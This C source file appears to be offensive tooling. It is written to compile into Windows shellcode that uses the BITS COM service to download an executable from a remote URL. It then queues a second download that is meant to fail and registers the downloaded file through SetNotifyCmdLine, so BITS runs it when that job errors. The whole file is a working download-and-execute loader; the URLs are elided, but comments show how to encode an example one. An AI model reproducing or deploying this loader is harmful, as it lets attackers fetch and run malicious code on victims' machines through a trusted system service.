/*	compile with shellcode compiler:
	scc -D SCC --unloaded-modules --arch x64 --platform windows bitsscc.c -o bitsscc.exe -f pe

	compile with Visual Studio:
	cl /Zi bitsscc.c Ole32.lib /Fe:bitsscc.exe
*/

#ifdef SCC
/* compiler is aware without headers */
#else
#include <stdio.h>
#include <stdint.h>
#endif

/* windows typedefs */
typedef uint32_t DWORD;
typedef int32_t HRESULT; /* signed, MSB (b31) indicates failure */
typedef void *PVOID;

#ifdef SCC
void __stdcall Sleep(int) __import("kernel32");
#endif

/* COM shit */
#define CLSCTX_LOCAL_SERVER 4
#define BG_JOB_TYPE_DOWNLOAD 0

#ifdef SCC
HRESULT __stdcall CoInitialize(void *pvReserved) __import("ole32");
HRESULT __stdcall CoCreateInstance(PVOID rclsid, PVOID pUnkOuter, DWORD dwClsContext, PVOID riid, PVOID *ppv) __import("ole32");
HRESULT __stdcall CoUninitialize(void) __import("ole32");
#else
HRESULT __stdcall CoInitialize(void *pvReserved);
HRESULT __stdcall CoCreateInstance(PVOID rclsid, PVOID pUnkOuter, DWORD dwClsContext, PVOID riid, PVOID *ppv);
HRESULT __stdcall CoUninitialize(void);
#endif

/* COM: BackgroundCopyManger (the main BITS object) */
char *CLSID_BackgroundCopyManager = "\x4b\xd3\x91\x49\xa1\x80\x91\x42\x83\xb6\x33\x28\x36\x6b\x90\x97";
char *IID_IBackgroundCopyManager = "\x0d\x4c\xe3\x5c\xc9\x0d\x1f\x4c\x89\x7c\xda\xa1\xb7\x8c\xee\x7c";

struct IBackgroundCopyManager_vtable {
	void *QueryInterface;
	void *AddRef;
	unsigned long (__stdcall *Release)(void *this);
	HRESULT (__stdcall *CreateJob)(void *this, void *DisplayName, int Type, void *pJobId, void **ppJob);
};

struct IBackgroundCopyManager {
	struct IBackgroundCopyManager_vtable *vtable;
};

/* COM: CopyJob
	C:\Program Files (x86)\Windows Kits\10\Include\10.0.17134.0\um\Bits.h */
struct IBackgroundCopyJob_vtable {
	HRESULT (__stdcall *QueryInterface)(void *this, void *riid, void **pobject);
	void *AddRef;
	unsigned long (__stdcall *Release)(void *this);
	void *AddFileSet;
    HRESULT (__stdcall *AddFile)(void *this, void *url, void *localname);
    void *EnumFiles;
    void *Suspend;
    HRESULT (__stdcall *Resume)(void *this);
	void *Cancel;
	HRESULT (__stdcall *Complete)(void *this);
	void *GetId;
	void *GetType;
	void *GetProgress;
	void *GetTime;
	HRESULT (__stdcall *GetState)(void *this, int *state);
};

struct IBackgroundCopyJob {
	struct IBackgroundCopyJob_vtable *vtable;
};

/* COM: CopyJob5 (so we get SetNotifyCmdLine())
	C:\Program Files (x86)\Windows Kits\10\Include\10.0.17134.0\um\Bits.h */

// DEFINE_GUID(IID_IBackgroundCopyJob5, 0xE847030C, 0xbbba, 0x4657, 0xaf, 0x6d, 0x48, 0x4a, 0xa4, 0x2b, 0xf1, 0xfe);
char *IID_IBackgroundCopyJob5 = "\x0c\x03\x47\xe8\xba\xbb\x57\x46\xaf\x6d\x48\x4a\xa4\x2b\xf1\xfe";

struct IBackgroundCopyJob5_vtable {
	void *QueryInterface;
	void *AddRef;
	unsigned long (__stdcall *Release)(void *this);
	void *AddFileSet;
    HRESULT (__stdcall *AddFile)(void *this, void *url, void *localname);
    void *EnumFiles;
    void *Suspend;
    HRESULT (__stdcall *Resume)(void *this);
	void *Cancel;
	HRESULT (__stdcall *Complete)(void *this);
	void *GetId;
	void *GetType;
	void *GetProgress;
	void *GetTime;
	HRESULT (__stdcall *GetState)(void *this, int *state);
	void *GetError;
	void *GetOwner;
	void *SetDisplayName;
	void *GetDisplayName;
	void *SetDescription;
	void *GetDescription;
	void *SetPriority;
	void *GetPriority;
	HRESULT (__stdcall *SetNotifyFlags)(void *this, int val);
	void *GetNotifyFlags;
	void *SetNotifyInterface;
	void *GetNotifyInterface;
	void *SetMinimumRetryDelay;
	void *GetMinimumRetryDelay;
	void *SetNoProgressTimeout;
	void *GetNoProgressTimeout;
	void *GetErrorCount;
	void *SetProxySettings;
	void *GetProxySettings;
	void *TakeOwnership;
	HRESULT (__stdcall *SetNotifyCmdLine)(void *this, void *program, void *params);
};

struct IBackgroundCopyJob5 {
	struct IBackgroundCopyJob5_vtable *vtable;
};

#define BG_JOB_STATE_QUEUED
#define BG_JOB_STATE_CONNECTING 1
#define BG_JOB_STATE_TRANSFERRING 2
#define BG_JOB_STATE_SUSPENDED 3
#define BG_JOB_STATE_ERROR 4
#define BG_JOB_STATE_TRANSIENT_ERROR 5
#define BG_JOB_STATE_TRANSFERRED 6
#define BG_JOB_STATE_ACKNOWLEDGED 7
#define BG_JOB_STATE_CANCELLED 8

#define BG_NOTIFY_JOB_TRANSFERRED 1
#define BG_NOTIFY_JOB_ERROR 2

int bits_download(struct IBackgroundCopyManager *pBits, char *url, char *local, char *pathexec)
{
	int rc = -1;
	HRESULT hResult;

	/* create job */
	struct IBackgroundCopyJob *pJob = NULL;
	uint8_t jobGuid[16];
	char *jobName = "\x4d\x00\x79\x00\x4a\x00\x6f\x00\x62\x00\x00\x00\x00\x00\x00\x00"; /* "MyJob" wchar_t's */

	printf("calling CreateJob()\n");
	hResult = pBits->vtable->CreateJob(pBits, jobName, BG_JOB_TYPE_DOWNLOAD, jobGuid, (void **)&pJob);
	if(hResult < 0) {
		printf("hResult: %X\n", hResult);
		goto cleanup;
	}

	/* create job5 (to get SetNotifyCmdLine()) */
	struct IBackgroundCopyJob5 *pJob5 = NULL;
	printf("calling QueryInterface()\n");
	hResult = pJob->vtable->QueryInterface(pJob, IID_IBackgroundCopyJob5, (void **)&pJob5);
	if(hResult < 0) {
		// 0x80004002 - no such interface supported
		printf("hResult: %X\n", hResult);
		goto cleanup;
	}
	
	printf("got job5 interface: %p\n", pJob5);

	/* add file to job */
	printf("calling AddFile()\n");
	hResult = pJob5->vtable->AddFile(pJob5, url, local);
	if(hResult < 0) {
		/* 0x80070005 - E_ACCESSDENIED */
		/* 0x80070057 - E_INVALIDARG */
		printf("hResult: %X\n", hResult);
		goto cleanup;
	}

	/* if program to execute, register it */
	if(pathexec) {
		printf("calling SetNotifyCmdLine()\n");
		hResult = pJob5->vtable->SetNotifyCmdLine(pJob5, pathexec, NULL);
		if(hResult < 0) {
			printf("hResult: %X\n", hResult);
			goto cleanup;
		}
		printf("calling SetNotifyFlags()\n");
		hResult = pJob5->vtable->SetNotifyFlags(pJob5, BG_NOTIFY_JOB_ERROR);
	}

	/* initiate, wait for download */
	printf("calling Resume()\n");
	hResult = pJob5->vtable->Resume(pJob5);
	if(hResult < 0) goto cleanup;

	int wait = 1;
	while(wait) {
		int state;
		printf("calling GetState()\n");
		hResult = pJob5->vtable->GetState(pJob5, &state);
		if(hResult < 0) goto cleanup;

		switch(state) {
			case BG_JOB_STATE_CONNECTING:
			case BG_JOB_STATE_TRANSFERRING:
				Sleep(1000);
				continue;
			case BG_JOB_STATE_TRANSFERRED:
			case BG_JOB_STATE_ERROR:
			case BG_JOB_STATE_TRANSIENT_ERROR:
				wait = 0;
				break;
		}
	}

	pJob5->vtable->Complete(pJob5);

	rc = 0;
	cleanup:

    if(pJob) {
    	printf("pJob is: %X, releasing\n", pJob);
    	pJob->vtable->Release(pJob);
    }
    if(pJob5) {
    	printf("pJob5 is: %X, releasing\n", pJob5);
    	pJob5->vtable->Release(pJob5);
    }

	return rc;
}

/* action */
int main()
{	
	HRESULT hResult;

	/* initialize, create bits objects */
	printf("calling CoInitialize()\n");
	hResult = CoInitialize(NULL);
	if(hResult < 0) goto cleanup;

	struct IBackgroundCopyManager *pBits = NULL;
	printf("calling CoCreateInstance()\n");
	hResult = CoCreateInstance(CLSID_BackgroundCopyManager, NULL, CLSCTX_LOCAL_SERVER, IID_IBackgroundCopyManager, (void **)&pBits);
	if(hResult < 0) goto cleanup;
	printf("got interface (pBits): %X\n", pBits);

	printf("downloading the file\n");
	// >>> print ''.join(map(lambda x: '\\x%02X\\x00' % x,  map(ord,list('http://acme.com/foo.exe\x00'))))
	char *url = "...";
	// >>> print ''.join(map(lambda x: '\\x%02X\\x00' % x,  map(ord,list('C:\writeable_path\foo.exe\x00'))))
	char *local = "...";

	if(bits_download(pBits, url, local, NULL))
		goto cleanup;
		
	printf("downloading the wrong file (and requesting exec on error)\n");
    // >>> print ''.join(map(lambda x: '\\x%02X\\x00' % x,  map(ord,list('http://acme.com/noexist.exe\x00'))))
	char *urlbad = "...";
	if(bits_download(pBits, urlbad, local, local))
		goto cleanup;

    cleanup:
    if(pBits) {
    	printf("pBits is: %X, releasing\n", pBits);
    	pBits->vtable->Release(pBits);
    }
    CoUninitialize();
    cleanup_nostart:
    return 0;
}
